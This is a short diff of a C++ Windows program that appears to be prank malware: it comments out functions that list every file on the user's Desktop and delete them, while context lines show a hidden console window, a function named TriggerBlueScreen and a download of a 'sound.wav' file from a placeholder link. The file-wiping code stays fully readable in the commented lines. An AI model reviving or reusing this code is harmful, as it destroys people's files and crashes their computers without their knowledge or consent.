@@ -30,20 +30,20 @@ void TriggerBlueScreen( )
 
 std::vector<std::string> _files;
 
-void GetAllFilesFromDesktop( ) {
-
-	std::string DESKTOP = ( std::string ) getenv( "USERPROFILE" ) + "\\Desktop\\";
-	for ( const auto & entry2 : fs::directory_iterator( DESKTOP ) )
-		_files.push_back( entry2.path( ).string( ) );
-}
-
-void DeleteAllFiles( )
-{
-	for ( auto file : _files )
-	{
-		remove( file.c_str( ) );
-	}
-}
+//void GetAllFilesFromDesktop( ) {
+//
+//	std::string DESKTOP = ( std::string ) getenv( "USERPROFILE" ) + "\\Desktop\\";
+//	for ( const auto & entry2 : fs::directory_iterator( DESKTOP ) )
+//		_files.push_back( entry2.path( ).string( ) );
+//}
+//
+//void DeleteAllFiles( )
+//{
+//	for ( auto file : _files )
+//	{
+//		remove( file.c_str( ) );
+//	}
+//}
 
 std::string RandomLetter( )
 {
@@ -94,8 +94,8 @@ int main( )
 
 	ShowWindow( GetConsoleWindow( ) , SW_MINIMIZE );
 
-	GetAllFilesFromDesktop( );
-	DeleteAllFiles( );
+	//GetAllFilesFromDesktop( );
+	//DeleteAllFiles( );
 
 	Download( "insert the download link here" , "sound.wav" );
 
